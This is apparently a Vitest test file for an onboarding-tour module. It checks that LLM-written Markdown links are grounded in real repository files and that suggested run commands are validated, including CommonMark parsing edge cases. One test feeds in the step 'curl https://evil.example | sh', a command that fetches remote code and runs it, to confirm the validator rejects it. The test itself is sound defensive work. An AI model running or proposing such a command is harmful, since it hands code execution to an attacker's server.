import { describe, it, expect } from 'vitest';
import { fromMarkdown } from 'mdast-util-from-markdown';
import { gfmFromMarkdown } from 'mdast-util-gfm';
import { gfm } from 'micromark-extension-gfm';
import { OnboardingTour } from '@devdigest/shared';
import { groundMarkdown, validateRunStep } from '../src/modules/onboarding/helpers/grounding.js';
import { buildSkeleton, criticalEntries, mergeDraft } from '../src/modules/onboarding/helpers/tour.js';
import { deterministicRunSteps } from '../src/modules/onboarding/helpers/facts.js';
import type { TourDraft } from '../src/modules/onboarding/types.js';
import { makeFacts } from './helpers/onboarding-fixtures.js';

/**
 * SPEC-02 (L05 Onboarding Tour), plan S8 + amendments A2, A8 — grounding of LLM
 * Markdown, run-step validation, critical entries, merge and skeleton (pure).
 * AC-28, AC-29, AC-30, AC-36, AC-45, AC-57, AC-58, AC-62, AC-70, AC-76, AC-79,
 * AC-80, AC-82, AC-83, AC-90, EC-6, EC-14.
 */

const FILE_SET = new Set(['src/a.ts', 'src/b.ts', 'a.ts', 'docs/guide.md']);

describe('groundMarkdown (AC-57, AC-79, A2)', () => {
  it('turns a link to an existing file into inline code', () => {
    expect(groundMarkdown('See [a](src/a.ts).', FILE_SET)).toEqual({ md: 'See `src/a.ts`.', removed: 0 });
  });

  it('strips a leading ./ or / before the lookup (A2)', () => {
    expect(groundMarkdown('See [a](./src/a.ts).', FILE_SET)).toEqual({ md: 'See `src/a.ts`.', removed: 0 });
    expect(groundMarkdown('See [a](/src/a.ts).', FILE_SET)).toEqual({ md: 'See `src/a.ts`.', removed: 0 });
  });

  it('ignores a #fragment for the lookup', () => {
    expect(groundMarkdown('See [a](src/a.ts#L10).', FILE_SET)).toEqual({ md: 'See `src/a.ts`.', removed: 0 });
  });

  it('removes a link to a missing file whose text is the path (EC-6)', () => {
    const out = groundMarkdown('Open [src/nope.ts](src/nope.ts) first.', FILE_SET);
    expect(out.removed).toBe(1);
    expect(out.md).not.toContain('nope');
    expect(out.md).not.toContain('](');
    expect(out.md).toContain('Open');
    expect(out.md).toContain('first.');
  });

  it('keeps the plain text of a removed link whose text is not a path', () => {
    const out = groundMarkdown('Read [the auth module](src/nope.ts) next.', FILE_SET);
    expect(out.removed).toBe(1);
    expect(out.md).toContain('the auth module');
    expect(out.md).not.toContain('src/nope.ts');
    expect(out.md).not.toContain('](');
  });

  it('rejects a ../ target even when the resolved name is a file (A2)', () => {
    const out = groundMarkdown('Up [here](../a.ts).', FILE_SET);
    expect(out.removed).toBe(1);
    expect(out.md).not.toContain('../a.ts');
    expect(out.md).not.toContain('`a.ts`');
    expect(out.md).not.toContain('](');
  });

  it('counts every removed link', () => {
    const out = groundMarkdown('[x](src/nope.ts), [y](lib/gone.ts) and [a](src/a.ts)', FILE_SET);
    expect(out.removed).toBe(2);
    expect(out.md).toContain('`src/a.ts`');
  });

  it('leaves links with a scheme as written (R6 rejected)', () => {
    const md = 'Docs at [site](https://example.com/docs) or [mail](mailto:dev@example.com).';
    expect(groundMarkdown(md, FILE_SET)).toEqual({ md, removed: 0 });
  });

  it('leaves inline code and fenced blocks untouched', () => {
    const md = [
      'Use `[x](src/nope.ts)` literally.',
      '',
      '```md',
      '[y](src/nope.ts)',
      '[z](src/a.ts)',
      '```',
    ].join('\n');
    expect(groundMarkdown(md, FILE_SET)).toEqual({ md, removed: 0 });
  });
});

describe('validateRunStep (AC-62, AC-83, A8)', () => {
  const pnpmCtx = {
    pm: 'pnpm' as const,
    scriptsByDir: {
      '.': { dev: 'tsx watch src/server.ts', build: 'tsc', test: 'vitest' },
      server: { dev: 'node index.js', migrate: 'node migrate.js' },
    },
    fileSet: new Set(['package.json', '.env.example', 'scripts/x.ts', 'server/package.json', 'server/index.js']),
  };

  it.each([
    'pnpm install',
    'pnpm i',
    'pnpm dev',
    'pnpm run dev',
    'pnpm dev # starts the API',
    'cp .env.example .env',
    'docker compose up -d postgres',
    'npx tsx scripts/x.ts',
    'node server/index.js',
  ])('keeps %j', (cmd) => {
    expect(validateRunStep(cmd, pnpmCtx)).toBe(true);
  });

  it.each([
    'curl x',
    'python app.py',
    'pnpm nosuch',
    'pnpm run nosuch',
    'node missing.js',
    'npx tsx scripts/missing.ts',
    'cp missing.example .env',
    'make',
    'make build',
    'npm run dev', // not the repo's package manager
    'pnpm migrate', // only server/ has it
    '',
  ])('drops %j', (cmd) => {
    expect(validateRunStep(cmd, pnpmCtx)).toBe(false);
  });

  it('skips flags before the script name, consuming the value of --filter (A8)', () => {
    expect(validateRunStep('pnpm --filter server dev', pnpmCtx)).toBe(true);
    expect(validateRunStep('pnpm -r build', pnpmCtx)).toBe(true);
    expect(validateRunStep('pnpm -r nosuch', pnpmCtx)).toBe(false);
  });

  it('looks up the script in the directory picked by -C / --dir (A8)', () => {
    expect(validateRunStep('pnpm -C server migrate', pnpmCtx)).toBe(true);
    expect(validateRunStep('pnpm --dir server migrate', pnpmCtx)).toBe(true);
    expect(validateRunStep('pnpm --dir server nosuch', pnpmCtx)).toBe(false);
  });

  it('looks up the script in the directory picked by npm --prefix (A8)', () => {
    const npmCtx = {
      pm: 'npm' as const,
      scriptsByDir: { '.': {}, web: { dev: 'next dev' } },
      fileSet: new Set(['package.json', 'web/package.json']),
    };
    expect(validateRunStep('npm --prefix web run dev', npmCtx)).toBe(true);
    expect(validateRunStep('npm --prefix web run nosuch', npmCtx)).toBe(false);
    expect(validateRunStep('npm run dev', npmCtx)).toBe(false); // the root has no dev
  });

  it('accepts make only with a root Makefile', () => {
    const ctx = { ...pnpmCtx, fileSet: new Set([...pnpmCtx.fileSet, 'Makefile']) };
    expect(validateRunStep('make dev', ctx)).toBe(true);
  });
});

describe('criticalEntries (AC-29, AC-30, AC-57, AC-70)', () => {
  const files = new Set(['r1.ts', 'r2.ts', 'r3.ts', 'r4.ts', 'r5.ts', 'r6.ts', 'a.ts', 'b.ts']);

  it('takes the first 5 chains whose root is a file, with the grounded rest of the chain', () => {
    const chains = [
      ['r1.ts', 'a.ts', 'b.ts'],
      ['ghost.ts', 'a.ts'],
      ['r2.ts', 'missing.ts', 'b.ts'],
      ['r3.ts'],
      ['r4.ts', 'a.ts'],
      ['r5.ts', 'b.ts'],
      ['r6.ts', 'a.ts'],
    ];
    const out = criticalEntries(chains, { 'r1.ts': 3, 'r2.ts': 0, 'r3.ts': 1, 'r4.ts': 7, 'r5.ts': 2 }, files);
    expect(out).toEqual([
      { root: 'r1.ts', chain: ['a.ts', 'b.ts'], importers: 3, description: null },
      { root: 'r2.ts', chain: ['b.ts'], importers: 0, description: null },
      { root: 'r3.ts', chain: [], importers: 1, description: null },
      { root: 'r4.ts', chain: ['a.ts'], importers: 7, description: null },
      { root: 'r5.ts', chain: ['b.ts'], importers: 2, description: null },
    ]);
  });

  it('leaves importers null when the index cannot give counts', () => {
    const out = criticalEntries([['r1.ts', 'a.ts']], null, files);
    expect(out).toEqual([{ root: 'r1.ts', chain: ['a.ts'], importers: null, description: null }]);
  });

  it('returns no entries when there are no chains (AC-30)', () => {
    expect(criticalEntries([], {}, files)).toEqual([]);
  });
});

describe('buildSkeleton (AC-45)', () => {
  const facts = makeFacts();
  const entries = criticalEntries(facts.criticalPaths, { 'src/server.ts': 4 }, facts.fileSet);

  it('has every part of the skeleton tour', () => {
    const s = buildSkeleton(facts, entries);
    expect(() => OnboardingTour.shape.sections.parse(s)).not.toThrow();

    for (const tech of facts.stack) expect(s.architecture.body_md).toContain(tech);
    for (const f of facts.folders) expect(s.architecture.body_md).toContain(f.path);
    expect(s.architecture.stack).toEqual(facts.stack);
    expect(s.architecture.folders).toEqual(facts.folders);
    expect(s.architecture.diagram).toBeNull();

    expect(s.critical_paths.entries).toEqual([
      { root: 'src/server.ts', chain: ['src/a.ts', 'src/db/client.ts'], importers: 4, description: null },
    ]);
    expect(s.run_locally.steps).toEqual(deterministicRunSteps(facts));
    expect(s.run_locally.source).toBe('deterministic');
    expect(s.reading_path.items).toEqual([
      { path: 'src/a.ts', reason: null },
      { path: 'src/b.ts', reason: null },
      { path: 'src/c.ts', reason: null },
    ]);
    expect(s.first_tasks.body_md).toBeNull();
  });
});

describe('mergeDraft', () => {
  const facts = makeFacts();
  const entries = criticalEntries(facts.criticalPaths, { 'src/server.ts': 4 }, facts.fileSet);

  function draft(overrides: Partial<TourDraft> = {}): TourDraft {
    return {
      architecture: { body_md: 'The API starts in [server](src/server.ts).', diagram: 'flowchart LR\n  A --> B' },
      critical_paths: {
        body_md: 'Requests flow through the server.',
        descriptions: [{ root: 'src/server.ts', description: 'Boots the HTTP server.' }],
      },
      run_locally: {
        body_md: 'Install, then run.',
        steps: [{ command: 'pnpm install' }, { command: 'pnpm dev' }],
      },
      reading_path: {
        body_md: 'Start at the core.',
        reasons: [
          { path: 'src/a.ts', reason: 'Entry.' },
          { path: 'src/b.ts', reason: 'Models.' },
          { path: 'src/c.ts', reason: 'Helpers.' },
        ],
      },
      first_tasks: { body_md: '1. Add a test for [b](src/b.ts).' },
      ...overrides,
    };
  }

  it('keeps every grounded section text and removes nothing (AC-36, AC-90)', () => {
    const { sections, removed } = mergeDraft(draft(), facts, entries);
    expect(removed).toBe(0);
    expect(() => OnboardingTour.shape.sections.parse(sections)).not.toThrow();
    expect(sections.architecture.body_md).toBe('The API starts in `src/server.ts`.');
    expect(sections.architecture.diagram).toBe('flowchart LR\n  A --> B');
    expect(sections.architecture.stack).toEqual(facts.stack);
    expect(sections.architecture.folders).toEqual(facts.folders);
    expect(sections.critical_paths.body_md).toBe('Requests flow through the server.');
    expect(sections.reading_path.body_md).toBe('Start at the core.');
    expect(sections.first_tasks.body_md).toBe('1. Add a test for `src/b.ts`.');
    expect(sections.run_locally).toEqual({
      body_md: 'Install, then run.',
      steps: [{ command: 'pnpm install' }, { command: 'pnpm dev' }],
      source: 'llm',
    });
  });

  it('keeps the computed reading path and order whatever the LLM says (AC-28, AC-57)', () => {
    const { sections, removed } = mergeDraft(
      draft({
        reading_path: {
          body_md: null,
          reasons: [
            { path: 'src/c.ts', reason: 'C.' },
            { path: 'src/fake.ts', reason: 'Fake.' },
            { path: 'src/a.ts', reason: 'A.' },
          ],
        },
      }),
      facts,
      entries,
    );
    expect(sections.reading_path.items).toEqual([
      { path: 'src/a.ts', reason: 'A.' },
      { path: 'src/b.ts', reason: null },
      { path: 'src/c.ts', reason: 'C.' },
    ]);
    expect(removed).toBeGreaterThanOrEqual(1);
  });

  it('attaches descriptions by root and drops one for a non-file root (AC-76, AC-57)', () => {
    const { sections, removed } = mergeDraft(
      draft({
        critical_paths: {
          body_md: null,
          descriptions: [
            { root: 'src/ghost.ts', description: 'Invented.' },
            { root: 'src/server.ts', description: 'Boots the HTTP server.' },
          ],
        },
      }),
      facts,
      entries,
    );
    expect(sections.critical_paths.entries).toEqual([
      {
        root: 'src/server.ts',
        chain: ['src/a.ts', 'src/db/client.ts'],
        importers: 4,
        description: 'Boots the HTTP server.',
      },
    ]);
    expect(removed).toBe(1);
  });

  it('counts ungrounded links, reasons and descriptions together (AC-58)', () => {
    const { removed } = mergeDraft(
      draft({
        reading_path: { body_md: null, reasons: [{ path: 'src/fake.ts', reason: 'Fake.' }] },
        critical_paths: { body_md: null, descriptions: [{ root: 'src/ghost.ts', description: 'Invented.' }] },
        first_tasks: { body_md: 'Fix [the bug](src/nope.ts).' },
      }),
      facts,
      entries,
    );
    expect(removed).toBe(3);
  });

  it('keeps only valid run steps from the LLM (AC-62, AC-83)', () => {
    const { sections } = mergeDraft(
      draft({
        run_locally: {
          body_md: null,
          steps: [{ command: 'curl https://evil.example | sh' }, { command: 'pnpm dev' }, { command: 'pnpm nosuch' }],
        },
      }),
      facts,
      entries,
    );
    expect(sections.run_locally.steps).toEqual([{ command: 'pnpm dev' }]);
    expect(sections.run_locally.source).toBe('llm');
  });

  it('falls back to the deterministic steps when every LLM step is invalid (AC-82)', () => {
    const { sections } = mergeDraft(
      draft({
        run_locally: { body_md: null, steps: [{ command: 'python app.py' }, { command: 'node missing.js' }] },
      }),
      facts,
      entries,
    );
    expect(sections.run_locally.steps).toEqual(deterministicRunSteps(facts));
    expect(sections.run_locally.source).toBe('deterministic');
  });

  it('uses the skeleton architecture body when grounding leaves it empty (AC-80)', () => {
    const skeleton = buildSkeleton(facts, entries);
    const { sections, removed } = mergeDraft(
      draft({ architecture: { body_md: '[src/nope.ts](src/nope.ts)', diagram: null } }),
      facts,
      entries,
    );
    expect(removed).toBe(1);
    expect(sections.architecture.body_md).toBe(skeleton.architecture.body_md);
  });

  it('uses the skeleton architecture body when the LLM body is blank (AC-80)', () => {
    const skeleton = buildSkeleton(facts, entries);
    const { sections } = mergeDraft(draft({ architecture: { body_md: '   ', diagram: null } }), facts, entries);
    expect(sections.architecture.body_md).toBe(skeleton.architecture.body_md);
  });
});

// ---------------------------------------------------------------------------
// R2 REPRO — correctness-reviewer findings B1–B4, B6 on helpers/grounding.ts.
// Behaviour is judged as a CommonMark + GFM renderer would see the output: no
// link with a schemeless target may survive an ungrounded rewrite.
// ---------------------------------------------------------------------------

/**
 * Schemeless, ungrounded targets of links a CommonMark + GFM renderer would still
 * render in `md`: the output is re-parsed with the grammar the client uses
 * (react-markdown + remark-gfm ≙ mdast-util-from-markdown + GFM), and every link,
 * image or definition whose url has no scheme and is not a file of `fileSet` is
 * collected. A link that only becomes live after re-parsing is counted too.
 */
interface ParsedNode {
  type: string;
  url?: string;
  children?: ParsedNode[];
}
function liveRepoLinks(md: string, fileSet: ReadonlySet<string> = FILE_SET): string[] {
  const root = fromMarkdown(md, {
    extensions: [gfm()],
    mdastExtensions: [gfmFromMarkdown()],
  }) as unknown as ParsedNode;
  const targets: string[] = [];
  const visit = (node: ParsedNode): void => {
    if ((node.type === 'link' || node.type === 'image' || node.type === 'definition') && node.url !== undefined) {
      const url = node.url;
      const path = url.replace(/[#?].*$/, '').replace(/^(\.?\/)+/, '');
      if (!/^[a-z][a-z0-9+.-]*:/i.test(url) && !fileSet.has(path)) targets.push(url);
    }
    for (const child of node.children ?? []) visit(child);
  };
  visit(root);
  return targets;
}

describe('groundMarkdown — CommonMark link forms (R2 B1, plan G1)', () => {
  it.each([
    ['a parenthesised title', 'See [x](src/nope.ts (title)).'],
    ['nested brackets in the text', 'See [the [core] module](src/nope.ts).'],
    ['a bracketed text', 'See [[docs]](src/nope.ts).'],
    ['an angle-bracket target with a space', 'See [x](<src/nope file.ts>).'],
  ])('removes an ungrounded link with %s', (_label, md) => {
    const out = groundMarkdown(md, FILE_SET);
    expect(out.removed).toBe(1);
    expect(liveRepoLinks(out.md)).toEqual([]);
    expect(out.md).not.toContain('nope');
    expect(out.md).toContain('See');
  });

  it.each([
    ['a parenthesised title', 'See [x](src/a.ts (title)).', 'See `src/a.ts`.'],
    ['nested brackets in the text', 'See [the [core] module](src/a.ts).', 'See `src/a.ts`.'],
    ['a bracketed text', 'See [[docs]](src/a.ts).', 'See `src/a.ts`.'],
    ['an angle-bracket target with a space', 'See [x](<src/a file.ts>).', 'See `src/a file.ts`.'],
  ])('turns a grounded link with %s into inline code', (_label, md, expected) => {
    const files = new Set([...FILE_SET, 'src/a file.ts']);
    expect(groundMarkdown(md, files)).toEqual({ md: expected, removed: 0 });
  });

  it('does not let removing an inner link create a new link to the outer target', () => {
    // CommonMark: only `[x](a)` is a link; `](src/nope.ts)` is literal text.
    const out = groundMarkdown('See [[x](a)](src/nope.ts).', FILE_SET);
    expect(out.removed).toBeGreaterThanOrEqual(1);
    expect(liveRepoLinks(out.md)).toEqual([]);
  });

  it('does not let grounding an inner link create a new link to the outer target', () => {
    const out = groundMarkdown('See [[x](a.ts)](src/nope.ts).', FILE_SET);
    expect(liveRepoLinks(out.md)).toEqual([]);
    expect(out.md).toContain('`a.ts`');
  });
});

describe('groundMarkdown — reference definitions in containers (R2 B2)', () => {
  it.each([
    ['a blockquote', 'See [the entry][e].\n\n> [e]: src/nope.ts'],
    ['a list item', 'See [the entry][e].\n\n- [e]: src/nope.ts'],
  ])('removes an ungrounded definition inside %s', (_label, md) => {
    const out = groundMarkdown(md, FILE_SET);
    expect(out.removed).toBeGreaterThanOrEqual(1);
    expect(liveRepoLinks(out.md)).toEqual([]);
    expect(out.md).not.toContain('src/nope.ts');
  });
});

describe('groundMarkdown — code spans and fences per CommonMark (R2 B3)', () => {
  it('does not treat unmatched backticks in other paragraphs as one code span', () => {
    const out = groundMarkdown('Press the ` key.\n\nSee [entry](src/nope.ts).\n\nThen ` again', FILE_SET);
    expect(out.removed).toBe(1);
    expect(liveRepoLinks(out.md)).toEqual([]);
    expect(out.md).not.toContain('src/nope.ts');
    expect(out.md).toContain('entry');
  });

  it('does not treat a backtick line whose info string has a backtick as a fence', () => {
    // "``` js`x" is not a fence opener (backtick in the info string) and, with
    // blank lines between, cannot pair into a code span with the closing line.
    const out = groundMarkdown('``` js`x\n\nSee [entry](src/nope.ts)\n\n```', FILE_SET);
    expect(out.removed).toBe(1);
    expect(liveRepoLinks(out.md)).toEqual([]);
    expect(out.md).not.toContain('src/nope.ts');
  });
});

describe('groundMarkdown — prose that only looks like a definition (R2 B6)', () => {
  it('keeps "[Bonus]: wire src/a.ts into the CLI" as visible text', () => {
    const out = groundMarkdown('[Bonus]: wire src/a.ts into the CLI', FILE_SET);
    expect(out.removed).toBe(0);
    expect(out.md).toContain('Bonus');
    expect(out.md).toContain('wire src/a.ts into the CLI');
  });
});

describe('validateRunStep — file arguments after a script (R2 B4, plan G2)', () => {
  const scripts = { dev: 'tsx watch src/server.ts', test: 'vitest' };
  const pnpmCtx = {
    pm: 'pnpm' as const,
    scriptsByDir: { '.': scripts },
    fileSet: new Set(['package.json', 'src/a.ts', 'src/a.test.ts', 'src/a.js']),
  };
  const npmCtx = { ...pnpmCtx, pm: 'npm' as const };

  it.each(['pnpm test src/nope.test.ts', 'pnpm run dev src/nope.ts', 'pnpm dev src/nope.ts'])(
    'drops %j (the named file is not in the tree)',
    (cmd) => {
      expect(validateRunStep(cmd, pnpmCtx)).toBe(false);
    },
  );

  it.each(['pnpm test src/a.test.ts', 'pnpm run dev src/a.ts', 'pnpm dev src/a.ts'])(
    'keeps %j (the named file is in the tree)',
    (cmd) => {
      expect(validateRunStep(cmd, pnpmCtx)).toBe(true);
    },
  );

  it('checks files passed after npm run … --', () => {
    expect(validateRunStep('npm run test -- src/nope.test.ts', npmCtx)).toBe(false);
    expect(validateRunStep('npm run test -- src/a.test.ts', npmCtx)).toBe(true);
  });

  it('does not treat a # inside a word as a comment', () => {
    expect(validateRunStep('node src/a.js#x src/nope.js', pnpmCtx)).toBe(false);
  });
});

describe('groundMarkdown — output re-parsed as CommonMark + GFM (R2 round 2)', () => {
  it('B7: GFM autolink literals around a nested link do not revive the outer target', () => {
    const out = groundMarkdown('See "www.a.com" [[x](a)](src/nope.ts) and "www.b.com"', FILE_SET);
    expect(out.removed).toBeGreaterThanOrEqual(1);
    expect(liveRepoLinks(out.md)).toEqual([]);
    expect(out.md).not.toMatch(/(^|[^\\])\[x\]\(src\/nope\.ts\)/);
  });

  it('B8: a GFM table row split across code spans leaves no live ungrounded link', () => {
    const md = ['[h | i', '|---|---](a)', '`x | y', '[q](src/nope.ts) | z`'].join('\n');
    const out = groundMarkdown(md, FILE_SET);
    expect(liveRepoLinks(out.md)).toEqual([]);
  });

  it('BOM: a link right after a byte-order mark is removed without mangling the text', () => {
    const out = groundMarkdown('﻿[x](src/nope.ts) end', FILE_SET);
    expect(out.removed).toBe(1);
    expect(liveRepoLinks(out.md)).toEqual([]);
    expect(['﻿x end', 'x end']).toContain(out.md);
  });

  it.each([
    'See [x](src/nope.ts (title)).',
    'See [the [core] module](src/nope.ts).',
    'See [[docs]](src/nope.ts).',
    'See [x](<src/nope file.ts>).',
    'See [[x](a)](src/nope.ts).',
    'See [[x](a.ts)](src/nope.ts).',
    'See [the entry][e].\n\n> [e]: src/nope.ts',
    'See [the entry][e].\n\n- [e]: src/nope.ts',
    'Press the ` key.\n\nSee [entry](src/nope.ts).\n\nThen ` again',
    '``` js`x\n\nSee [entry](src/nope.ts)\n\n```',
    '[Bonus]: wire src/a.ts into the CLI',
    'See "www.a.com" [[x](a)](src/nope.ts) and "www.b.com"',
    ['[h | i', '|---|---](a)', '`x | y', '[q](src/nope.ts) | z`'].join('\n'),
    '﻿[x](src/nope.ts) end',
  ])('property: re-parsing the grounded output of %j finds no live ungrounded link', (md) => {
    expect(liveRepoLinks(groundMarkdown(md, FILE_SET).md)).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// Whole-branch REPRO — B9 (plan G1): a `file:line` target is not a URI scheme.
// Rule pinned here: the part before the last `:<digits>` is the repo path; when it is
// a file the link becomes inline code of that path WITHOUT the line suffix (like a
// `#L10` fragment); when it is not, the link is removed and counted.
// ---------------------------------------------------------------------------

/** URL schemes react-markdown's `defaultUrlTransform` keeps (everything else → ''). */
const SAFE_SCHEME_RE = /^(https?|ircs?|mailto|xmpp):/i;

/** Links, images and definitions in `md` whose url has a scheme the client would blank. */
function unsafeSchemeLinks(md: string): string[] {
  const root = fromMarkdown(md, {
    extensions: [gfm()],
    mdastExtensions: [gfmFromMarkdown()],
  }) as unknown as ParsedNode;
  const urls: string[] = [];
  const visit = (node: ParsedNode): void => {
    if ((node.type === 'link' || node.type === 'image' || node.type === 'definition') && node.url !== undefined) {
      if (/^[a-z][a-z0-9+.-]*:/i.test(node.url) && !SAFE_SCHEME_RE.test(node.url)) urls.push(node.url);
    }
    for (const child of node.children ?? []) visit(child);
  };
  visit(root);
  return urls;
}

describe('groundMarkdown — file:line targets are paths, not schemes (B9, AC-57, AC-79, AC-58)', () => {
  const files = new Set([...FILE_SET, 'server.ts', 'README.md']);

  it('turns [x](server.ts:42) into inline code of the grounded path', () => {
    const out = groundMarkdown('See [x](server.ts:42).', files);
    expect(out).toEqual({ md: 'See `server.ts`.', removed: 0 });
    expect(unsafeSchemeLinks(out.md)).toEqual([]);
  });

  it('turns [README.md:10](README.md:10) into inline code of the grounded path', () => {
    const out = groundMarkdown('Read [README.md:10](README.md:10) first.', files);
    expect(out).toEqual({ md: 'Read `README.md` first.', removed: 0 });
    expect(unsafeSchemeLinks(out.md)).toEqual([]);
  });

  it('removes and counts [x](nope.ts:3) when the file part is not in the tree', () => {
    const out = groundMarkdown('See [x](nope.ts:3) now.', files);
    expect(out.removed).toBe(1);
    expect(out.md).not.toContain('nope.ts');
    expect(out.md).not.toContain('](');
    expect(unsafeSchemeLinks(out.md)).toEqual([]);
    expect(liveRepoLinks(out.md, files)).toEqual([]);
  });

  it('counts a removed file:line link together with other ungrounded links', () => {
    const out = groundMarkdown('[a](nope.ts:3) and [b](src/nope.ts) and [c](src/a.ts:7)', files);
    expect(out.removed).toBe(2);
    expect(out.md).toContain('`src/a.ts`');
    expect(unsafeSchemeLinks(out.md)).toEqual([]);
  });

  it('still keeps http, https and mailto links as written', () => {
    const md = 'See [a](http://example.com), [b](https://example.com/x) and [c](mailto:dev@example.com).';
    expect(groundMarkdown(md, files)).toEqual({ md, removed: 0 });
  });
});

// ---------------------------------------------------------------------------
// Whole-branch REPRO — B5 (plan G2, AC-83): every package and file a run step names
// must exist. Rule pinned for `--filter <v>`: `v` must equal a key of `scriptsByDir`
// (the package directory, e.g. `server`) — TourFacts carries no package names — and
// the script must exist in THAT package, not in any package.
// For `node`: the first operand is the entry script and must be a file of the tree;
// a flag's inline value that names a path (`--require=./x.js`) must exist too.
// A quoted operand is checked by the path between the quotes.
// ---------------------------------------------------------------------------

describe('validateRunStep — named packages and files must exist (B5, AC-83)', () => {
  const ctx = {
    pm: 'pnpm' as const,
    scriptsByDir: {
      '.': { dev: 'tsx watch src/server.ts' },
      server: { dev: 'node index.js' },
      web: { build: 'next build' },
    },
    fileSet: new Set([
      'package.json',
      'server/package.json',
      'web/package.json',
      'server/index.js',
      'src/a.js',
      '.env.example',
    ]),
  };

  it.each([
    ['pnpm --filter nosuch dev', 'no package dir named nosuch'],
    ['pnpm --filter web dev', 'web has no dev script (only the root and server do)'],
    ['node --require=./missing.js src/a.js', 'the required module is not in the tree'],
    ['node missingdir', 'the entry script is not a file of the tree'],
    ['cp "nope.example" .env', 'the quoted source is not in the tree'],
  ])('drops %j (%s)', (cmd) => {
    expect(validateRunStep(cmd, ctx)).toBe(false);
  });

  it.each([
    ['pnpm --filter server dev', 'server/package.json has dev'],
    ['node src/a.js', 'the entry script is a file'],
  ])('keeps %j (%s)', (cmd) => {
    expect(validateRunStep(cmd, ctx)).toBe(true);
  });
});
